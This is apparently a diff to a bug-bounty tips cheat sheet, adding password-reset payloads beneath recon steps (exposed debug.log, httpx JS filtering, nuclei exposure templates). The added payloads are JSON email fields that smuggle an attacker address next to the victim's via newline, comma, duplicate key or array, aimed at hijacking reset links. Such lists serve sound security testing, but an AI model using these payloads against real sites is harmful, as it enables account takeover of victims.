@@ -66,6 +66,18 @@ Tips : https://target[.]com/wp-content/debug.log
 2- filter all js files 
 3- cat allurls | httpx -content-type | grep 'application/javascript
 4-  nuclei -t /root/nuclei-templates/exposures/
+-----------------------------------------------------------------------------------------------------------
+                                            password reset 
+                                            {"email":"victim@gmail.com\nattacker@gmail.com"}
+                                            {"email":"victim@gmail.com,attacker@gmail.com"}
+                                            {"email":"victim@gmial.com","email":"attacker@gmail.com"}
+                                            {"email":["victim@gmail.com","attacker@gmial.com"]}
+
+
+
+
+
+
 
 
   
